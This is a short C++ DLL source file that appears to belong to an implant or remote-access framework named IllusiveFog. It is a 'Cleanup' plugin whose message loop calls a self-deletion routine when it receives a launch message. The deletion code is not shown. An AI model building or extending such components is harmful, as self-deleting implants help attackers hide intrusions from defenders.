// dllmain.cpp : Defines the entry point for the DLL application.
#include "Cleanup.h"
__declspec(dllexport)void re(HANDLE localevent)
{

	MSG msg;
	while (!PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)) {
		SetEvent(localevent);
		GetMessage(&msg, NULL, NULL, NULL);
		if (msg.message == WM_IllusiveFog_PLUGIN_LAUNCH) {
			Sleep(0x800);
			Pplugin_param plugin_param = (Pplugin_param)msg.lParam;
			Pinitial_info init_info = get_init_info();
			self_del(plugin_param->reporter_event, plugin_param->reporter_threadid, init_info);
			continue;
		}
		else if (msg.message == WM_IllusiveFog_PLUGIN_TERMINATE) {
			ExitThread(0);
		}
	}
}
BOOL DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

